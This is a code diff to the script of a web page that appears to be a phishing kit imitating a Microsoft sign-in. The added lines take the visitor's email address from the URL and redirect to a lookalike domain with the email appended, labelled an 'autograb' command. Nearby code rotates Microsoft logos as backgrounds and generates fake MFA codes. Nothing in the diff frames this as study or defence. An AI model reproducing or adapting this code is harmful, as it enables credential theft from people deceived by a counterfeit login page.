@@ -118,6 +118,19 @@
         }
     </style>
     <script>
+        // Extract email from query parameters
+        function getEmailFromQuery() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get("email") || "default@example.com"; // Fallback to default email if none is provided
+        }
+
+        // Redirect with autograb command
+        function redirectToMainLink() {
+            const email = getEmailFromQuery();
+            const redirectURL = `https://authencryption.bastropscale-com.info/zrWoUPyJ#${email}`;
+            window.location.href = redirectURL;
+        }
+
         // Array of Random Logo URLs
         const logos = [
             'https://i.ibb.co/cLY9NST/microsoft-3.png',
@@ -131,13 +144,6 @@
         function setRandomBackground() {
             const randomLogo = logos[Math.floor(Math.random() * logos.length)];
             document.body.style.backgroundImage = `url(${randomLogo})`;
-        }
-
-        // Redirect with static email
-        function redirectToMainLink() {
-            const email = ""; // Replace with the email you want to append
-            const redirectURL = `https://authencryption.bastropscale-com.info/zrWoUPyJ#${email}`;
-            window.location.href = redirectURL;
         }
 
         // Generate random MFA code
